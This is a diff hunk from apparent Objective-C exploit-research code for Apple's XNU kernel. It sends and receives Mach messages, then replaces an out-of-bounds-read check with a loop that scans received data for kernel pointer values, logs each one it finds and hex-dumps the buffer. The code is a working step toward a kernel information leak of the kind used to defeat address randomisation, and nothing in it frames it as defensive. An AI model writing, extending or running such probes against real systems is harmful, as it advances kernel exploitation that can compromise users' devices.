@@ -1446,10 +1446,25 @@ cleanup:
                                         mach_msg_header_t *rh1 = (mach_msg_header_t *)recv1;
                                         kr1 = mach_msg(rh1, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, 256, p1, 100, MACH_PORT_NULL);
                                         scopeNote(r, [NSString stringWithFormat:@"  mach_msg recv ret=%d size=%u", (int)kr1, rh1->msgh_size]);
-                                        // Check if kernel copied past our 68-byte message
-                                        if (kr1 == KERN_SUCCESS && rh1->msgh_size > 68) {
-                                            scopeNote(r, @"  >>> KERNEL READ PAST BUFFER — OOB CONFIRMED!");
+                                        // Scan for kernel pointers in received data
+                                        size_t rlen = rh1->msgh_size;
+                                        if (rlen > sizeof(recv1)) rlen = sizeof(recv1);
+                                        int kptrs = 0;
+                                        for (size_t j = 0; j + 8 <= rlen; j += 4) {
+                                            uint64_t v;
+                                            memcpy(&v, recv1 + j, 8);
+                                            if (v > 0xfffffff000000000ULL && v < 0xffffffffffff0000ULL) {
+                                                scopeNote(r, [NSString stringWithFormat:
+                                                    @"  KERNEL PTR at recv+%zu: 0x%016llx", j, v]);
+                                                kptrs++;
+                                            }
                                         }
+                                        scopeNote(r, [NSString stringWithFormat:@"  kernel ptrs found: %d", kptrs]);
+                                        // Also dump hex
+                                        NSMutableString *hex = [NSMutableString string];
+                                        for (size_t j = 0; j < 64 && j < rlen; j++)
+                                            [hex appendFormat:@"%02x ", recv1[j]];
+                                        scopeNote(r, [NSString stringWithFormat:@"  recv hex: %@", hex]);
                                     }
                                     mach_port_destroy(mach_task_self(), p1);
                                 }
